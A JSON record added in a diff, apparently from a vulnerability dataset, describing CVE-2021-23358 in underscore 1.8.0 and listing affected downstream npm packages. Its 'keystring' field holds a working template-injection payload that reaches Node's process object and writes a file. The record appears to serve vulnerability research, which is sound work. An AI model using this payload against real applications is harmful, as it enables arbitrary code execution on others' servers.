@@ -1,0 +1,21 @@
+{
+  "id": "CVE-2021-23358",
+  "upstream": "underscore@1.8.0",
+  "keymethod": "templateSettings.variable",
+  "keystring": "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)",
+  "location": "modules/template.js:71:14",
+  "downstreams": [
+    "fh-forms@1.16.10",
+    "fh-mbaas-client@0.5.1",
+    "fh-fhc@2.17.1-516",
+    "bodacious@0.2.0",
+    "menio@0.2.1",
+    "tovtest1@0.0.1",
+    "fh-messaging-client@1.0.0",
+    "sggames@1.0.1",
+    "fh-metrics-client@1.0.0",
+    "syntax-scope-inspector@0.0.22",
+    "fh-forms-lcm@1.0.0",
+    "bolster@1.0.0"
+  ]
+}
